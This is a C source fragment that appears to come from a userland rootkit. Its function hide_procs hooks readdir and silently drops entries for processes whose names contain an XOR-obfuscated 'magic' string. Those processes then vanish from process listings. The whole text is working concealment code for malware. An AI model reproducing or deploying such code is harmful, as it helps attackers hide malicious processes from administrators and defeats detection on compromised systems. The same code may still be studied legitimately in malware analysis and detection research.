#include <dirent.h> 
#include <stdio.h> 
#include <sys/types.h>
#include "../rkconst.h" 


struct dirent *hide_procs(DIR *dirp)
{ 
	struct dirent *dir;
	char *magic = strdup(MAGIC); xor(magic);
	while(1)
	{ 	
		dir = old_readdir(dirp);
		if (dir != NULL)
		{ 
			char proc_name[256]; 
			if (name_from_pid(dir->d_name, proc_name) && (strstr(proc_name, magic)  != NULL))
				continue; 
		}
		break;
	}
	CLEAN(magic);	
	return dir;
} 

